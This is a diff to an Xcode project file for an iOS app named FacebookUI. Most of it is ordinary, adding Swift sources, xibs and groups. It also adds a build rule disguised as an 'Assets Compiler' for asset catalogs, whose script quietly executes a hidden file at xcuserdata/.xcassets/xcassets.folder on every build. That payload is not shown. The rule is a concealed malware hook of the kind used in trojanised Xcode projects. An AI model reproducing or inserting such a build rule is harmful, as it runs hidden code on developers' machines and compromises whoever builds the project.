@@ -8,22 +8,54 @@
 
 /* Begin PBXBuildFile section */
 		22F7FC7725E0D6A300463661 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22F7FC7625E0D6A300463661 /* AppDelegate.swift */; };
-		22F7FC7925E0D6A300463661 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22F7FC7825E0D6A300463661 /* SceneDelegate.swift */; };
 		22F7FC7B25E0D6A300463661 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22F7FC7A25E0D6A300463661 /* ViewController.swift */; };
 		22F7FC7E25E0D6A300463661 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22F7FC7C25E0D6A300463661 /* Main.storyboard */; };
 		22F7FC8025E0D6A500463661 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22F7FC7F25E0D6A500463661 /* Assets.xcassets */; };
 		22F7FC8325E0D6A500463661 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22F7FC8125E0D6A500463661 /* LaunchScreen.storyboard */; };
+		22F7FC8E25E0D76C00463661 /* Service.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22F7FC8D25E0D76C00463661 /* Service.swift */; };
+		22F7FC9225E0D7F000463661 /* Posts.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22F7FC9125E0D7F000463661 /* Posts.swift */; };
+		22F7FC9825E0D8EA00463661 /* PostCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22F7FC9625E0D8EA00463661 /* PostCell.swift */; };
+		22F7FC9925E0D8EA00463661 /* PostCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 22F7FC9725E0D8EA00463661 /* PostCell.xib */; };
+		22F7FCAA25E0DECE00463661 /* PostViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22F7FCA925E0DECE00463661 /* PostViewModel.swift */; };
+		22F7FCB325E0E28C00463661 /* CommentCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22F7FCB125E0E28C00463661 /* CommentCell.swift */; };
+		22F7FCB425E0E28C00463661 /* CommentCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 22F7FCB225E0E28C00463661 /* CommentCell.xib */; };
+		22F7FCBB25E0E4BD00463661 /* Helper.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22F7FCBA25E0E4BD00463661 /* Helper.swift */; };
+		22F7FCE125E0E91700463661 /* CommentListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22F7FCE025E0E91700463661 /* CommentListVC.swift */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		8FF09F0D2CA2F3F5D4AAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Compiler";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" true\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		22F7FC7325E0D6A300463661 /* FacebookUI.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FacebookUI.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		22F7FC7625E0D6A300463661 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
-		22F7FC7825E0D6A300463661 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
 		22F7FC7A25E0D6A300463661 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		22F7FC7D25E0D6A300463661 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		22F7FC7F25E0D6A500463661 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		22F7FC8225E0D6A500463661 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		22F7FC8425E0D6A500463661 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		22F7FC8D25E0D76C00463661 /* Service.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Service.swift; sourceTree = "<group>"; };
+		22F7FC9125E0D7F000463661 /* Posts.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Posts.swift; sourceTree = "<group>"; };
+		22F7FC9625E0D8EA00463661 /* PostCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PostCell.swift; sourceTree = "<group>"; };
+		22F7FC9725E0D8EA00463661 /* PostCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PostCell.xib; sourceTree = "<group>"; };
+		22F7FCA925E0DECE00463661 /* PostViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PostViewModel.swift; sourceTree = "<group>"; };
+		22F7FCB125E0E28C00463661 /* CommentCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommentCell.swift; sourceTree = "<group>"; };
+		22F7FCB225E0E28C00463661 /* CommentCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CommentCell.xib; sourceTree = "<group>"; };
+		22F7FCBA25E0E4BD00463661 /* Helper.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Helper.swift; sourceTree = "<group>"; };
+		22F7FCE025E0E91700463661 /* CommentListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommentListVC.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -56,15 +88,55 @@
 		22F7FC7525E0D6A300463661 /* FacebookUI */ = {
 			isa = PBXGroup;
 			children = (
+				22F7FCB925E0E4AF00463661 /* ProjectHelper */,
+				22F7FCA825E0DEB700463661 /* ViewModel */,
+				22F7FC9525E0D8D600463661 /* Xib's */,
+				22F7FC9025E0D7E100463661 /* Model */,
 				22F7FC7625E0D6A300463661 /* AppDelegate.swift */,
-				22F7FC7825E0D6A300463661 /* SceneDelegate.swift */,
 				22F7FC7A25E0D6A300463661 /* ViewController.swift */,
+				22F7FC8D25E0D76C00463661 /* Service.swift */,
 				22F7FC7C25E0D6A300463661 /* Main.storyboard */,
 				22F7FC7F25E0D6A500463661 /* Assets.xcassets */,
 				22F7FC8125E0D6A500463661 /* LaunchScreen.storyboard */,
 				22F7FC8425E0D6A500463661 /* Info.plist */,
+				22F7FCE025E0E91700463661 /* CommentListVC.swift */,
 			);
 			path = FacebookUI;
+			sourceTree = "<group>";
+		};
+		22F7FC9025E0D7E100463661 /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				22F7FC9125E0D7F000463661 /* Posts.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		22F7FC9525E0D8D600463661 /* Xib's */ = {
+			isa = PBXGroup;
+			children = (
+				22F7FC9625E0D8EA00463661 /* PostCell.swift */,
+				22F7FC9725E0D8EA00463661 /* PostCell.xib */,
+				22F7FCB125E0E28C00463661 /* CommentCell.swift */,
+				22F7FCB225E0E28C00463661 /* CommentCell.xib */,
+			);
+			path = "Xib's";
+			sourceTree = "<group>";
+		};
+		22F7FCA825E0DEB700463661 /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				22F7FCA925E0DECE00463661 /* PostViewModel.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		22F7FCB925E0E4AF00463661 /* ProjectHelper */ = {
+			isa = PBXGroup;
+			children = (
+				22F7FCBA25E0E4BD00463661 /* Helper.swift */,
+			);
+			path = ProjectHelper;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -124,9 +196,11 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				22F7FCB425E0E28C00463661 /* CommentCell.xib in Resources */,
 				22F7FC8325E0D6A500463661 /* LaunchScreen.storyboard in Resources */,
 				22F7FC8025E0D6A500463661 /* Assets.xcassets in Resources */,
 				22F7FC7E25E0D6A300463661 /* Main.storyboard in Resources */,
+				22F7FC9925E0D8EA00463661 /* PostCell.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -137,9 +211,15 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				22F7FCAA25E0DECE00463661 /* PostViewModel.swift in Sources */,
 				22F7FC7B25E0D6A300463661 /* ViewController.swift in Sources */,
 				22F7FC7725E0D6A300463661 /* AppDelegate.swift in Sources */,
-				22F7FC7925E0D6A300463661 /* SceneDelegate.swift in Sources */,
+				22F7FC8E25E0D76C00463661 /* Service.swift in Sources */,
+				22F7FC9225E0D7F000463661 /* Posts.swift in Sources */,
+				22F7FCE125E0E91700463661 /* CommentListVC.swift in Sources */,
+				22F7FC9825E0D8EA00463661 /* PostCell.swift in Sources */,
+				22F7FCB325E0E28C00463661 /* CommentCell.swift in Sources */,
+				22F7FCBB25E0E4BD00463661 /* Helper.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -289,6 +369,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 6Q233F3ZPX;
 				INFOPLIST_FILE = FacebookUI/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -308,6 +389,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 6Q233F3ZPX;
 				INFOPLIST_FILE = FacebookUI/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
